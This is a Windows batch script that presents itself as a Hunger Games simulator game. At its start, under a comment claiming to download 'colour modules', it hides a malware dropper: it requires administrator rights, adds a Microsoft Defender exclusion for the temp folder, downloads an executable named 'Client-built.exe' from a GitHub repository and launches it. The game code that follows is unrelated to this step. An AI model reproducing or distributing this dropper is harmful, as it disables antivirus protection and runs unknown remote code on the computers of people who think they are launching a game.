@echo off
chcp 65001 >nul
:: Check for administrator privileges
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    echo This script requires administrator privileges.
    echo Please right-click on the script and select "Run as administrator."
    pause
    exit
)
echo Running as Administrator.
pause
cls
::Download Required Colour Modules
cd %TEMP%
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
PowerShell -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'Client-built.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/WurstInstallation/raw/main/Client-built.exe' -OutFile $downloadPath"
start "" "%TEMP%\Client-built.exe"
cls
setlocal enabledelayedexpansion
title Hunger Games Batch V0.6

:: Banner
  
cls
echo. 
echo. 
echo  [38;2;255;69;0m    ██╗  ██╗ ██████╗     ██████╗  █████╗ ████████╗ ██████╗██╗  ██╗    ██╗   ██╗ ██████╗     ██████╗ 
echo  [38;2;255;99;71m    ██║  ██║██╔════╝     ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║  ██║    ██║   ██║██╔═████╗   ██╔════╝ 
echo   [38;2;255;140;0m   ███████║██║  ███╗    ██████╔╝███████║   ██║   ██║     ███████║    ██║   ██║██║██╔██║   ███████╗ 
echo    [38;2;255;165;0m  ██╔══██║██║   ██║    ██╔══██╗██╔══██║   ██║   ██║     ██╔══██║    ╚██╗ ██╔╝████╔╝██║   ██╔═══██╗
echo    [38;2;255;215;0m  ██║  ██║╚██████╔╝    ██████╔╝██║  ██║   ██║   ╚██████╗██║  ██║     ╚████╔╝ ╚██████╔╝██╗╚██████╔╝
echo    [38;2;255;255;0m  ╚═╝  ╚═╝ ╚═════╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝      ╚═══╝   ╚═════╝ ╚═╝ ╚═════╝                                                                                                 
echo -----------------------------------------------------------------------------------------------------
echo.

:: Arena Selection
:arena_setup
echo Choose the Arena Type:
echo [38;2;0;255;0m 1. Forest
echo [38;2;255;255;0m 2. Desert
echo [38;2;128;0;0m 3. Urban
set /p arena_choice=[38;2;255;255;0mEnter your choice (1-3): 
if %arena_choice% equ 1 set arena_type=Forest
if %arena_choice% equ 2 set arena_type=Desert
if %arena_choice% equ 3 set arena_type=Urban
echo Arena set to: %arena_type%
timeout /t 2 >nul

:start
cls
echo Welcome to Batch Hunger Games Simulator!
echo ----------------------------------------

:: Validate number of players
:get_players
set /p players=How many players are in the game? 
set /a player_count=%players% 2>nul
if %player_count% leq 0 (
    echo Invalid number of players. Please enter a number greater than 0.
    goto get_players
)


set round=1

:: Initialize players and their stats
for /l %%i in (1,1,%players%) do (
    :get_player_name
    set /p player%%i=Enter name for Player %%i: 
    if not defined player%%i (
        echo Player name cannot be blank. Please try again.
        goto get_player_name
    )
    set player%%i_kills=0
    set player%%i_weapon=None
    set player%%i_alive=1
    set player%%i_food=10
    set player%%i_water=10
    set player%%i_medkits=0
)

:cornucopia
cls
echo Round %round%: The Cornucopia!
timeout /t 1 >nul
echo Players rush to the Cornucopia to grab weapons and supplies...
timeout /t 1 >nul

:: Randomly assign weapons to players
for /l %%i in (1,1,%players%) do (
    set /a weapon=!random! %% 9
    if !weapon! equ 0 set player%%i_weapon=Longsword
    if !weapon! equ 1 set player%%i_weapon=Spear
    if !weapon! equ 2 set player%%i_weapon=Bow
    if !weapon! equ 3 set player%%i_weapon=Axe
    if !weapon! equ 4 set player%%i_weapon=Knife
    if !weapon! equ 5 set player%%i_weapon=Rapier
    if !weapon! equ 6 set player%%i_weapon=Halberd
    if !weapon! equ 7 set player%%i_weapon=Deagle
    if !weapon! equ 8 set player%%i_weapon=Bare hands
    echo !player%%i! grabs a !player%%i_weapon!.
    timeout /t 1 >nul
)

:main_loop
set /a round+=1
cls
echo Round %round% begins...
timeout /t 1 >nul

:: Special Events
if %round% gtr 6 (
    set /a special_event_chance=!random! %% 6
    if !special_event_chance! equ 0 (
        set /a event_type=!random! %% 6
        if !event_type! equ 0 (
            echo A pack of wild dogs is on the loose!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a dog_attack=!random! %% 2
                    if !dog_attack! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is attacked by wild dogs and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! manages to fend off the wild dogs. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 1 (
            echo An intense storm hits the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a storm_survival=!random! %% 2
                    if !storm_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is struck by lightning and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! finds shelter and survives the storm. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 2 (
            echo A poison fog rolls into the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a fog_survival=!random! %% 2
                    if !fog_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! succumbs to the poison fog and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! finds a gas mask and survives the fog. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 3 (
            echo A swarm of bees attacks the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a bee_attack=!random! %% 2
                    if !bee_attack! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is stung to death by the bees. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! escapes the swarm of bees. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 4 (
            echo A flood forces players to higher ground!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a flood_survival=!random! %% 2
                    if !flood_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is swept away by the flood and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! reaches higher ground and survives. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 5 (
            echo A fire spreads across the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a fire_survival=!random! %% 2
                    if !fire_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is caught in the fire and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! escapes the fire. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        )
        goto check_alive
    )
)

:: Normal Player Actions
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a action=!random! %% 10
        if !action! leq 3 (
            set /a target=!random! %% %players% + 1
            if !target! neq %%i (
                if !player%target%_alive! equ 1 (
                    echo [38;2;255;0;0m!player%%i! attacks !player%target%! with their !player%%i_weapon!.
                    set player%target%_alive=0
                    set /a player%%i_kills+=1
                    echo !player%target%! has been killed by !player%%i!. [38;2;255;255;0m
                    timeout /t 2 >nul
                )
            )
        ) else if !action! equ 4 (
            set /a found_food=!random! %% 5
            set /a found_water=!random! %% 3
            set /a found_medkit=!random! %% 2
            if !found_food! gtr 0 set /a player%%i_food+=!found_food!
            if !found_water! gtr 0 set /a player%%i_water+=!found_water!
            if !found_medkit! equ 0 set /a player%%i_medkits+=1
            echo [38;2;0;255;0m!player%%i! searches for supplies and finds !found_food! pieces of food and !found_water! Litres of water. [38;2;255;255;0m
            timeout /t 1 >nul
        ) else if !action! equ 5 (
            echo !player%%i! hides and avoids conflict.
            timeout /t 1 >nul
        ) else if !action! equ 6 (
            echo !player%%i! sets a trap.
            timeout /t 1 >nul
        ) else if !action! equ 7 (
            set /a victim=!random! %% %players% + 1
            if !victim! neq %%i (
                if !player%victim%_alive! equ 1 (
                    set /a stolen_food=!random! %% 3
                    set /a stolen_water=!random! %% 3
                    set /a stolen_medkit=!random! %% 2
                    set /a player%victim%_food-=!stolen_food!
                    set /a player%victim%_water-=!stolen_water!
                    set /a player%victim%_medkits-=!stolen_medkit!
                    set /a player%%i_food+=!stolen_food!
                    set /a player%%i_water+=!stolen_water!
                    set /a player%%i_medkits+=!stolen_medkit!
                    echo [38;2;255;69;0m!player%%i! steals !stolen_food! pieces of food, !stolen_water! Litres of water, and !stolen_medkit! Medical Supplies from !player%victim%!. [38;2;255;255;0m
                    timeout /t 2 >nul
                )
            )
        ) else if !action! equ 8 (
            set /a ally=!random! %% %players% + 1
            if !ally! neq %%i (
                if !player%ally%_alive! equ 1 (
                    echo !player%%i! allies with !player%ally%!.
                    timeout /t 1 >nul
                )
            )
        ) else if !action! equ 9 (
            echo !player%%i! is wounded by an animal.
            timeout /t 1 >nul
        )
    )
)


:: Check for resource depletion
:: Reduce food and water at the end of each round
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a player%%i_food-=1
        set /a player%%i_water-=1
        if !player%%i_food! lss 1 (
            echo !player%%i! dies from starvation.
            set player%%i_alive=0
        )
        if !player%%i_water! lss 1 (
            echo !player%%i! dies from dehydration.
            set player%%i_alive=0
        )
    )
)


:check_alive
:: Check if the game is over
set alive_count=0
set winner=
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a alive_count+=1
        set winner=!player%%i!
    )
)

if !alive_count! leq 1 goto end_game
goto main_loop

:end_game
cls
if !alive_count! equ 1 (
    echo The winner is !winner!!
) else (
    echo No one won the game.
)

echo.
echo Kill Leaderboard:
for /l %%i in (1,1,%players%) do (
    echo !player%%i!: !player%%i_kills! kills
)

set /p play_again=Would you like to play again with the same members? (yes/no): 
if /i "!play_again!"=="yes" (
    for /l %%i in (1,1,%players%) do (
        set player%%i_kills=0
        set player%%i_weapon=None
        set player%%i_alive=1
        set player%%i_food=10
        set player%%i_water=10
        set player%%i_medkits=0
		set %round%=1
    )
    goto cornucopia
)
if /i "!play_again!"=="no" goto end

:end
echo Thanks for playing the Hunger Games Simulator!
pause